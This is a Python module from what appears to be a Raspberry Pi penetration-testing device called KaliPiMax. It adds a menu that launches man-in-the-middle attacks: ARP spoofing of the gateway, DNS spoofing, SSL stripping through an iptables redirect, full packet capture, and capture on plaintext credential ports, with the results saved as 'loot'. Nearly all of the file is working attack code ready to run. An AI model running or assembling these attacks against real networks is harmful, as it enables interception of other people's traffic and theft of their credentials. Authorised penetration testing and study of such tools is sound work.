#!/usr/bin/env python3
"""
KaliPiMax MITM Mode
Man-in-the-middle attacks: ARP spoofing, DNS spoofing, packet capture.
"""

import subprocess
from PIL import Image

from ui.base_mode import MenuMode
from ui.renderer import Canvas
from core.state import state, AlertLevel
from core.payload import payload_runner, get_loot_path
from config import MITM_TIMEOUT, CAPTURE_TIMEOUT


def get_gateway() -> str:
    """Get default gateway IP."""
    try:
        result = subprocess.run(
            "ip route | grep default | awk '{print $3}'",
            shell=True, capture_output=True, text=True, timeout=2
        )
        return result.stdout.strip() or "192.168.1.1"
    except:
        return "192.168.1.1"


def get_interface() -> str:
    """Get primary network interface."""
    try:
        result = subprocess.run(
            "ip route | grep default | awk '{print $5}'",
            shell=True, capture_output=True, text=True, timeout=2
        )
        return result.stdout.strip() or "eth0"
    except:
        return "eth0"


def get_local_ip() -> str:
    """Get local IP address."""
    try:
        result = subprocess.run(
            "hostname -I | awk '{print $1}'",
            shell=True, capture_output=True, text=True, timeout=2
        )
        return result.stdout.strip() or "N/A"
    except:
        return "N/A"


def enable_ip_forwarding():
    """Enable IP forwarding for MITM attacks."""
    try:
        subprocess.run(
            "sudo sysctl -w net.ipv4.ip_forward=1",
            shell=True, capture_output=True, timeout=5
        )
        return True
    except:
        return False


class MITMMode(MenuMode):
    """
    Man-in-the-middle attack mode.
    
    Actions: ARP spoof, DNS spoof, SSL strip, packet capture
    """
    
    def __init__(self):
        super().__init__("MITM", "🕵")
        
        self._interface = None
        self._gateway = None
        self._local_ip = None
        
        self._menu_items = [
            {'icon': '●', 'text': 'ARP Spoof (GW)', 'action': self._arp_spoof_gateway},
            {'icon': '●', 'text': 'DNS Spoof', 'action': self._dns_spoof},
            {'icon': '●', 'text': 'SSL Strip', 'action': self._ssl_strip},
            {'icon': '●', 'text': 'Packet Capture', 'action': self._packet_capture},
            {'icon': '●', 'text': 'HTTP Capture', 'action': self._http_capture},
            {'icon': '●', 'text': 'Creds Capture', 'action': self._creds_capture},
            {'icon': '■', 'text': 'Stop All MITM', 'action': self._stop_all},
        ]
    
    def on_enter(self):
        super().on_enter()
        self._refresh_network_info()
    
    def _refresh_network_info(self):
        """Refresh network configuration."""
        self._interface = get_interface()
        self._gateway = get_gateway()
        self._local_ip = get_local_ip()
    
    def _arp_spoof_gateway(self):
        """ARP spoof the gateway (become MITM for all hosts)."""
        if not enable_ip_forwarding():
            state.add_alert("Failed to enable IP forwarding", AlertLevel.ERROR)
            return
        
        outfile = get_loot_path("mitm", "arp_spoof", "log")
        
        # Spoof in both directions
        payload_runner.run(
            f"sudo arpspoof -i {self._interface} "
            f"-t {self._gateway} -r 2>&1 | tee {outfile}",
            f"ARP Spoof ({self._gateway})",
            timeout=MITM_TIMEOUT + 10
        )
    
    def _dns_spoof(self):
        """DNS spoofing attack."""
        outfile = get_loot_path("mitm", "dns_spoof", "log")
        
        payload_runner.run(
            f"sudo dnsspoof -i {self._interface} "
            f"2>&1 | tee {outfile}",
            "DNS Spoof",
            timeout=MITM_TIMEOUT + 10
        )
    
    def _ssl_strip(self):
        """SSL stripping attack."""
        # Set up iptables redirect
        setup_cmd = (
            f"sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 "
            f"-j REDIRECT --to-port 8080"
        )
        
        outfile = get_loot_path("mitm", "sslstrip", "log")
        
        payload_runner.run(
            f"{setup_cmd} && sudo sslstrip -l 8080 "
            f"2>&1 | tee {outfile}",
            "SSL Strip",
            timeout=MITM_TIMEOUT + 10
        )
    
    def _packet_capture(self):
        """Capture all network packets."""
        outfile = get_loot_path("mitm", "capture", "pcap")
        
        payload_runner.run(
            f"sudo tcpdump -i {self._interface} "
            f"-w {outfile}",
            "Packet Capture",
            timeout=CAPTURE_TIMEOUT + 10
        )
    
    def _http_capture(self):
        """Capture HTTP traffic only."""
        outfile = get_loot_path("mitm", "http_capture", "pcap")
        
        payload_runner.run(
            f"sudo tcpdump -i {self._interface} "
            f"-w {outfile} 'port 80 or port 8080'",
            "HTTP Capture",
            timeout=CAPTURE_TIMEOUT + 10
        )
    
    def _creds_capture(self):
        """Capture potential credentials (HTTP auth, FTP, etc.)."""
        outfile = get_loot_path("mitm", "creds_capture", "pcap")
        
        # Capture common credential ports
        ports = "port 21 or port 23 or port 25 or port 80 or port 110 or port 143"
        
        payload_runner.run(
            f"sudo tcpdump -i {self._interface} "
            f"-w {outfile} '{ports}'",
            "Creds Capture",
            timeout=CAPTURE_TIMEOUT + 10
        )
    
    def _stop_all(self):
        """Stop all MITM tools and clean up."""
        cleanup_cmd = (
            "sudo pkill -9 arpspoof; "
            "sudo pkill -9 dnsspoof; "
            "sudo pkill -9 sslstrip; "
            "sudo pkill -9 tcpdump; "
            "sudo iptables -t nat -F; "
            "sudo sysctl -w net.ipv4.ip_forward=0"
        )
        
        payload_runner.run(
            cleanup_cmd,
            "Stop MITM",
            timeout=10
        )
    
    def render(self) -> Image.Image:
        canvas = self._create_canvas()
        
        y = self._render_header(canvas)
        
        # Show network info
        canvas.text(2, y, f"IF: {self._interface}", colour='info', font='tiny')
        y += 9
        canvas.text(2, y, f"GW: {self._gateway}", colour='highlight', font='tiny')
        y += 9
        canvas.text(2, y, f"IP: {self._local_ip}", colour='text_dim', font='tiny')
        y += 10
        
        # Menu
        self._menu.start_y = y
        self._render_menu(canvas, start_y=y)
        
        # self._render_footer(canvas, "K3:Stop All")
        
        return canvas.get_image()
    
    def on_key3(self):
        """Stop all MITM attacks."""
        self._stop_all()
